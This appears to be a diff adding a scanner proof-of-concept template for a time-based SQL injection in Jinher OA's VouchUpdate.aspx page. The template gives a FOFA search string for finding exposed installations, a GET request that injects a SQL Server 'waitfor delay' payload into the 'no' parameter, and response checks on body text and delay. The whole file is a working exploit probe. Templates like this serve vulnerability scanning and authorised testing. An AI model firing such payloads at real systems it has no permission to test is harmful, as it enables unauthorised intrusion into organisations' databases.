@@ -1,0 +1,29 @@
+id: poc-yaml-jinher-jhsoft-vouchupdate-aspx-sqli
+info:
+  name: 金和OA VouchUpdate.aspx SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 金和OA
+  fofa: app="金和网络-金和OA"
+variables:
+  t1: random_int(1,5)
+  t2: t1 * 3
+  t3: t2 + 2
+requests:
+- method: GET
+  path: /c6/JHSoft.Web.CostControl/BudgetExecution/VouchUpdate.aspx/?no=1'waitfor+delay%270:0:{{.t1}}%27--&type=1
+  expression: 'status_code == 200 &&
+
+    contains(gbk_decode(body),"修改凭证") &&
+
+    contains(gbk_decode(body),"现金流项目") &&
+
+    contains(gbk_decode(body),"费用科目") &&
+
+    duration >= t2 &&
+
+    duration <= t3
+
+    '
+transport: http
